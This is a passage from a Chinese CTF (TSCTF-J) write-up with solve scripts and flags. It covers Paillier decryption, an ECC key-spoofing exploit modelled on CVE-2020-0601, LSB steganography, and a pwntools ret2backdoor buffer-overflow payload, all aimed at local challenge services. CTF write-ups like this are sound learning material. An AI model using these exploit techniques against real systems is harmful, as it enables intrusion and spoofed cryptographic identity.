个未知系数。</p><p>得到的 75 个系数就是 flag 的三进制数字。把它们按照低位在前的顺序拼回去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">1_000_003</span>  <span class="comment"># large prime, works for Gaussian elimination</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gauss_mod</span>(<span class="params">mat, rhs, mod</span>):</span><br><span class="line">  n = <span class="built_in">len</span>(mat)</span><br><span class="line">  aug = [row[:] + [rhs[i] % mod] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(mat)]</span><br><span class="line">  row = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      pivot = <span class="built_in">next</span>((r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(row, n) <span class="keyword">if</span> aug[r][col] % mod), <span class="literal">None</span>)</span><br><span class="line">      <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      aug[row], aug[pivot] = aug[pivot], aug[row]</span><br><span class="line">      inv = <span class="built_in">pow</span>(aug[row][col], -<span class="number">1</span>, mod)</span><br><span class="line">      aug[row] = [(val * inv) % mod <span class="keyword">for</span> val <span class="keyword">in</span> aug[row]]</span><br><span class="line">      <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">          <span class="keyword">if</span> r != row <span class="keyword">and</span> aug[r][col] % mod:</span><br><span class="line">              factor = aug[r][col] % mod</span><br><span class="line">              aug[r] = [(aug[r][c] - factor * aug[row][c]) % mod <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>)]</span><br><span class="line">      row += <span class="number">1</span></span><br><span class="line">  sol = [<span class="number">0</span>] * n</span><br><span class="line">  <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      leading = <span class="built_in">next</span>((c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">if</span> aug[r][c] % mod), <span class="literal">None</span>)</span><br><span class="line">      <span class="keyword">if</span> leading <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">          sol[leading] = aug[r][-<span class="number">1</span>] % mod</span><br><span class="line">  <span class="keyword">return</span> sol</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;challenge.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(lines[<span class="number">0</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">k = <span class="built_in">int</span>(lines[<span class="number">2</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">vals = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, lines[<span class="number">4</span>:]))</span><br><span class="line"></span><br><span class="line">ciphertexts = vals[:<span class="number">2</span> * k]</span><br><span class="line">raws = vals[<span class="number">2</span> * k:]</span><br><span class="line">n2 = n * n</span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> c, raw <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertexts, raws):</span><br><span class="line">  r = raw % n</span><br><span class="line">  rn = <span class="built_in">pow</span>(r, n, n2)</span><br><span class="line">  gm = (c * <span class="built_in">pow</span>(rn, -<span class="number">1</span>, n2)) % n2</span><br><span class="line">  y.append((gm - <span class="number">1</span>) // n)</span><br><span class="line"></span><br><span class="line">mat, rhs = [], []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">  mat.append([y[i + k - <span class="number">1</span> - j] % MOD <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k)])</span><br><span class="line">  rhs.append(y[k + i] % MOD)</span><br><span class="line"></span><br><span class="line">coeffs = solve_gauss_mod(mat, rhs, MOD)</span><br><span class="line">value = <span class="built_in">sum</span>(d * <span class="built_in">pow</span>(<span class="number">3</span>, i) <span class="keyword">for</span> i, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(coeffs))</span><br><span class="line">flag = long_to_bytes(value)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{We_sh0u1d_kn0w!}</p><h3 id="Microsoft’s-gifts"><a href="#Microsoft’s-gifts" class="headerlink" title="Microsoft’s gifts"></a>Microsoft’s gifts</h3><p>deepseek立大功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># secp256r1曲线参数</span></span><br><span class="line">p = <span class="number">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF</span></span><br><span class="line">a = <span class="number">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC</span></span><br><span class="line">b = <span class="number">0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B</span></span><br><span class="line">n = <span class="number">0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EllipticCurve</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a: <span class="built_in">int</span>, b: <span class="built_in">int</span>, p: <span class="built_in">int</span>, g: <span class="built_in">tuple</span>, name: <span class="built_in">str</span> = <span class="string">&quot;secp256r1&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line">        <span class="variable language_">self</span>.g = g</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_on_curve</span>(<span class="params">self, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        x, y = point</span><br><span class="line">        <span class="keyword">return</span> (y * y - x * x * x - <span class="variable language_">self</span>.a * x - <span class="variable language_">self</span>.b) % <span class="variable language_">self</span>.p == <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, p1: <span class="built_in">tuple</span>, p2: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> p1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> p2</span><br><span class="line">        <span class="keyword">if</span> p2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> p1</span><br><span class="line">        x1, y1 = p1</span><br><span class="line">        x2, y2 = p2</span><br><span class="line">        <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 != y2:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> x1 == x2:</span><br><span class="line">            m = (<span class="number">3</span> * x1 * x1 + <span class="variable language_">self</span>.a) * inverse(<span class="number">2</span> * y1, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = (y1 - y2) * inverse(x1 - x2, <span class="variable language_">self</span>.p)</span><br><span class="line">        m %= <span class="variable language_">self</span>.p</span><br><span class="line">        x3 = (m * m - x1 - x2) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = (y1 + m * (x3 - x1)) % <span class="variable language_">self</span>.p</span><br><span class="line">        y3 = (-y3) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiply</span>(<span class="params">self, k: <span class="built_in">int</span>, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.multiply(-k, <span class="variable language_">self</span>.negate(point))</span><br><span class="line">        result = <span class="literal">None</span></span><br><span class="line">        addend = point</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">                result = <span class="variable language_">self</span>.add(result, addend)</span><br><span class="line">            addend = <span class="variable language_">self</span>.add(addend, addend)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">negate</span>(<span class="params">self, point: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        x, y = point</span><br><span class="line">        <span class="keyword">return</span> (x, (-y) % <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 连接到题目服务</span></span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">61018</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收公钥</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;public key is &#x27;</span>)</span><br><span class="line">    pub_str = r.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received public key: <span class="subst">&#123;pub_str&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析公钥 - 处理带引号的十六进制字符串</span></span><br><span class="line">    pub_str = pub_str.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    x_str, y_str = pub_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x_p = <span class="built_in">int</span>(x_str, <span class="number">16</span>)</span><br><span class="line">    y_p = <span class="built_in">int</span>(y_str, <span class="number">16</span>)</span><br><span class="line">    public_key = (x_p, y_p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Parsed public key: (<span class="subst">&#123;<span class="built_in">hex</span>(x_p)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(y_p)&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建曲线对象</span></span><br><span class="line">    curve = EllipticCurve(a, b, p, <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算2的逆元 (mod n)</span></span><br><span class="line">    inv2 = inverse(<span class="number">2</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;inverse of 2 mod n: <span class="subst">&#123;<span class="built_in">hex</span>(inv2)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算公钥的一半作为新的基点G</span></span><br><span class="line">    G_half = curve.multiply(inv2, public_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;New base point G: (<span class="subst">&#123;<span class="built_in">hex</span>(G_half[<span class="number">0</span>])&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(G_half[<span class="number">1</span>])&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证新基点是否在曲线上</span></span><br><span class="line">    <span class="keyword">if</span> curve.is_on_curve(G_half):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;New base point is on curve ✓&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: New base point is not on curve!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送曲线参数</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your curve now: [p, a, b]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;[<span class="subst">&#123;p&#125;</span>, <span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>]&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent curve parameters&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送基点G</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your g which is on the curve: [gx, gy]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;[<span class="subst">&#123;G_half[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;G_half[<span class="number">1</span>]&#125;</span>]&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent base point G&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送私钥</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Tell me your private_key: key&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sent private key: 2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收结果</span></span><br><span class="line">    result = r.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试接收更多输出（比如flag）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = r.recvline(timeout=<span class="number">2</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013101730857.png" alt="image-20251013101730857"></p><p>TSCTF-J{Microsoft-CVE-2020-0601}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>TSCTF-J{Th4nk5_F0r_Y0ur_4ttend1n9}</p><h3 id="卢森堡的秘密"><a href="#卢森堡的秘密" class="headerlink" title="卢森堡的秘密"></a>卢森堡的秘密</h3><p>图片binwalk -e secret.png 发现有zip</p><p>提出来的时候失败了</p><p>万能的AI给了个神奇的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, zlib</span><br><span class="line"></span><br><span class="line">w, h, bpp = <span class="number">1920</span>, <span class="number">1607</span>, <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paeth</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    p = a + b - c</span><br><span class="line">    pa, pb, pc = <span class="built_in">abs</span>(p - a), <span class="built_in">abs</span>(p - b), <span class="built_in">abs</span>(p - c)</span><br><span class="line">    <span class="keyword">if</span> pa &lt;= pb <span class="keyword">and</span> pa &lt;= pc:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span> pb &lt;= pc:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">assert</span> f.read(<span class="number">8</span>) == <span class="string">b&quot;\x89PNG\r\n\x1a\n&quot;</span></span><br><span class="line">    idat = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        length, ctype = struct.unpack(<span class="string">&quot;&gt;I4s&quot;</span>, f.read(<span class="number">8</span>))</span><br><span class="line">        data, crc = f.read(length), f.read(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ctype == <span class="string">b&quot;IDAT&quot;</span>:</span><br><span class="line">            idat += data</span><br><span class="line">        <span class="keyword">elif</span> ctype == <span class="string">b&quot;IEND&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">raw = zlib.decompress(idat)</span><br><span class="line">stride, prev, pixels, off = w * bpp, [<span class="number">0</span>] * (w * bpp), [], <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    ftype = raw[off]</span><br><span class="line">    row = <span class="built_in">bytearray</span>(raw[off + <span class="number">1</span>:off + <span class="number">1</span> + stride])</span><br><span class="line">    <span class="keyword">if</span> ftype == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            row[i] = (row[i] + (row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            row[i] = (row[i] + prev[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            left = row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            up = prev[i]</span><br><span class="line">            row[i] = (row[i] + ((left + up) &gt;&gt; <span class="number">1</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">elif</span> ftype == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stride):</span><br><span class="line">            left = row[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            up = prev[i]</span><br><span class="line">            up_left = prev[i - bpp] <span class="keyword">if</span> i &gt;= bpp <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            row[i] = (row[i] + paeth(left, up, up_left)) &amp; <span class="number">0xFF</span></span><br><span class="line">    pixels.extend(row)</span><br><span class="line">    prev, off = <span class="built_in">list</span>(row), off + stride + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bits = [p &amp; <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> pixels]</span><br><span class="line">msg = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    chunk = bits[i:i + <span class="number">8</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> chunk:</span><br><span class="line">        byte = (byte &lt;&lt; <span class="number">1</span>) | b</span><br><span class="line">    <span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    msg.append(byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(msg.decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{Th3_sEcre7_0f_L$B!}</p><h3 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h3><p>解压meow.zip得到<strong>xml</strong>里面有base64码表</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011183403149.png" alt="image-20251011183403149"></p><p>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h3><p>超级入门题，直接ret2backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># pwnfile = &#x27;../toolcode/libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">50262</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../toolcode/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># rop = ROP(pwnfile)</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span> + <span class="number">0x8</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;sign-in!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(<span class="number">0x400676</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011140426789.png" alt="image-20251011140426789"></p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>利用溢出打pop ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 